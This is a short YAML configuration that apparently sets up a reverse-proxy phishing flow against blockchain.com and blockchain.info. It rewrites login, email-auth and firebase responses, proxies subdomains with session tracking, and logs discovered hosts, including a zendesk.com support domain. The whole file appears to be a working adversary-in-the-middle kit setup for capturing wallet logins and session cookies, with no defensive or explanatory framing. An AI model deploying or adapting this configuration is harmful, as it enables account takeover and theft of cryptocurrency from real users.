flow:
  cors_credentials: true
  css_url_canary: true
  json_rewrite:
    host_contains: [blockchain.com, blockchain.info, googleapis.com]
    path_contains: [/nabu-gateway/, /auth/login, /auth/email, geolocation, firebase]
  dynamic_hosts:
    - domain: blockchain.com
      preserve_sub: true
      session: true
      auto_filter: true
      exclude_subs: [login, www, api, wallet-helper, status, wealth, exchange]
      log_discover: true
    - domain: blockchain.info
      preserve_sub: true
      session: true
      auto_filter: true
      exclude_subs: [api]
      log_discover: true
    - domain: zendesk.com
      preserve_sub: true
      session: false
      auto_filter: true
      exclude_subs: [blockchain]
      log_discover: false
